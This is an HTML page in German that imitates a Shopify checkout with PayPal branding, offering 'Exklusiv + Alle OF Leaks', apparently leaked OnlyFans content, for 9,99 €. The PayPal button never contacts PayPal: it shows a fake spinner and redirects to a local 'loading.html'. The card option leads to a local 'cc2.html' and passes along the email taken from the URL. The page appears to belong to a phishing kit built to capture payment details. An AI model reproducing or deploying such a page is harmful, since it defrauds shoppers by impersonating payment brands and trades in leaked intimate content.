<!doctype html>
<html lang="de">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Checkout – PayPal</title>
  <style>
    :root{
      --purple:#4B32E3;
      --text:#111827;
      --muted:#6B7280;
      --line:#E5E7EB;
      --panel:#F3F4F6;
      --shadow: 0 1px 3px rgba(0,0,0,.06);
      --radius:14px;
      --font:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial;
      --blue:#2563EB;

      --danger:#DC2626;
      --danger-bg:#FEF2F2;
    }
    *{box-sizing:border-box}
    body{margin:0;font-family:var(--font);color:var(--text);background:#fff}
    header{height:74px;display:flex;align-items:flex-end;border-bottom:1px solid var(--line)}
    .brand{width:min(1120px,100%);margin:0 auto;padding:0 28px 18px;font-size:22px;font-weight:700}

    .shell{min-height:calc(100vh - 74px);display:grid;grid-template-columns:1.12fr .88fr}
    .left{padding:22px 24px 28px;border-right:1px solid var(--line);display:flex;justify-content:center}
    .right{background:var(--panel);padding:34px 40px}
    .panel{width:min(720px,100%)}

    .toprow{display:flex;justify-content:space-between;align-items:center;padding-bottom:16px;border-bottom:1px solid var(--line);margin-bottom:18px}
    .shopword{color:var(--purple);font-weight:800;font-size:22px}
    .acct{display:flex;gap:10px;font-size:14px;align-items:center}
    .kebab::before{content:"⋮";font-size:18px;color:#6B7280}

    h2{margin:0 0 4px;font-size:24px}
    .sub{margin:0 0 14px;font-size:14px;color:var(--muted)}

    .paycard{background:#fff;border:1px solid var(--line);border-radius:var(--radius);box-shadow:var(--shadow);overflow:hidden}

    .method-row,.paypal-row{
      display:flex;justify-content:space-between;align-items:center;
      padding:12px 14px;border:0;width:100%;text-align:left;background:#fff;
    }

    .paypal-row{
      background:#F5F8FF;
      outline:1.5px solid var(--blue);
      outline-offset:-1.5px;
      cursor:default;
    }

    .method-row.is-clickable{
      cursor:pointer;
      transition:background .15s ease;
    }
    .method-row.is-clickable:hover{
      background:#F9FAFB;
    }

    .method-left{display:flex;gap:10px;align-items:center;font-weight:600;font-size:14px}
    .radio{width:16px;height:16px;border-radius:50%;border:2px solid var(--blue);display:grid;place-items:center;background:#fff}
    .radio:after{content:"";width:8px;height:8px;border-radius:50%;background:var(--blue)}
    .radio.off{border-color:#D1D5DB}
    .radio.off:after{display:none}

    .paypal-badge{font-weight:900;color:#003087}
    .paypal-badge span{color:#009CDE}

    .fields{padding:14px}
    .hint{font-size:14px;color:var(--muted);line-height:1.45;margin:0}
    .note{margin-top:10px;font-size:13px;color:var(--muted)}

    .cta{margin-top:14px;display:flex;flex-direction:column;gap:10px}
    .buy{
      width:100%;height:56px;border-radius:12px;border:0;background:var(--purple);
      color:#fff;font-size:16px;font-weight:800;cursor:pointer;
      display:flex;align-items:center;justify-content:center;gap:10px;
    }
    .buy[disabled]{opacity:.65;cursor:not-allowed}
    .spinner{
      width:16px;height:16px;border-radius:50%;
      border:2px solid rgba(255,255,255,.45);border-top-color:#fff;
      animation:spin .8s linear infinite;display:none;
    }
    .buy.is-loading .spinner{display:inline-block}
    @keyframes spin{to{transform:rotate(360deg)}}

    .form-alert{
      display:none;margin:14px 0 0;border:1px solid rgba(220,38,38,.35);background:var(--danger-bg);
      color:#7F1D1D;border-radius:12px;padding:10px 12px;font-size:13px;line-height:1.35
    }
    .form-alert.show{display:block}

    .line-item{display:flex;gap:14px;margin-bottom:20px}
    .thumb{width:52px;height:52px;border-radius:12px;border:1px solid var(--line);display:grid;place-items:center;background:#fff;position:relative}
    .badge{position:absolute;top:-8px;left:-8px;width:22px;height:22px;border-radius:50%;background:#111827;color:#fff;font-size:12px;display:grid;place-items:center}
    .item-name{flex:1;font-size:14px}
    .price{font-size:14px}
    .total{display:flex;justify-content:space-between;margin-top:24px}
    .total .label{font-size:22px;font-weight:700}
    .total .amount{display:flex;gap:10px;align-items:baseline}
    .total .cur{font-size:12px;color:var(--muted);letter-spacing:.06em}
    .total .val{font-size:22px;font-weight:800}

    @media(max-width:980px){
      .shell{grid-template-columns:1fr}
      .left{border-right:0;border-bottom:1px solid var(--line)}
      .right{padding:24px}
    }
  </style>
</head>

<body>
<header><div class="brand">Shopify</div></header>

<main class="shell">
  <section class="left">
    <div class="panel">
      <div class="toprow">
        <div class="shopword">shop</div>
        <div class="acct">
          <span id="userEmail">—</span>
          <span class="kebab" aria-hidden="true"></span>
        </div>
      </div>

      <h2>Zahlung</h2>
      <p class="sub">Du wirst sicher zu PayPal weitergeleitet.</p>

      <div class="paycard">
        <!-- Kreditkarte (klickbar -> card.html) -->
        <button type="button" class="method-row is-clickable" id="goCard">
          <div class="method-left">
            <span class="radio off" aria-hidden="true"></span>
            <span>Kreditkarte</span>
          </div>
          <div style="color:#6B7280;font-size:13px;font-weight:600;">wechseln</div>
        </button>

        <!-- PayPal (aktiv) -->
        <div class="paypal-row">
          <div class="method-left"><span class="radio" aria-hidden="true"></span><span>PayPal</span></div>
          <div class="paypal-badge">Pay<span>Pal</span></div>
        </div>

        <div class="fields">
          <p class="hint">
            Klicke auf „Mit PayPal fortfahren“. Danach öffnet sich PayPal, und du kannst dort die Zahlung abschließen.
          </p>
          

          <div id="formAlert" class="form-alert" role="alert"></div>

          <div class="cta">
            <button id="ppBtn" class="buy" type="button">
              <span class="spinner" aria-hidden="true"></span>
              <span class="buyText">Mit PayPal fortfahren</span>
            </button>
          </div>
        </div>
      </div>
    </div>
  </section>

  <aside class="right">
    <div class="line-item">
      <div class="thumb"><span class="badge">1</span></div>
      <div class="item-name">Exklusiv + Alle OF Leaks</div>
      <div class="price">9,99 €</div>
    </div>
    <div class="total">
      <div class="label">Gesamt</div>
      <div class="amount"><div class="cur">EUR</div><div class="val">9,99 €</div></div>
    </div>
  </aside>
</main>

<script>
  const $ = (s, r=document) => r.querySelector(s);

  // Email anzeigen (aus ?email=...)
  (() => {
    const params = new URLSearchParams(location.search);
    const email = params.get("email");
    if (email) $("#userEmail").textContent = email;
  })();

  function showError(msg){
    const el = $("#formAlert");
    el.textContent = msg;
    el.classList.add("show");
  }

  // Oben auf Kreditkarte klicken -> card.html (nimmt ?email=... mit)
  $("#goCard").addEventListener("click", () => {
    const params = new URLSearchParams(location.search);
    const email = params.get("email");
    location.href = "cc2.html" + (email ? `?email=${encodeURIComponent(email)}` : "");
  });

  // PayPal starten (Placeholder: dein Backend soll approveUrl liefern)
  const ppBtn = document.getElementById("ppBtn");
const buyText = ppBtn.querySelector(".buyText");

ppBtn.addEventListener("click", () => {
  // Button-UI
  ppBtn.disabled = true;
  ppBtn.classList.add("is-loading");
  buyText.textContent = "Weiterleitung…";

  // kleine Pause für UX (optional)
  setTimeout(() => {
    window.location.href = "loading.html";
  }, 300);
});
</script>
</body>
</html>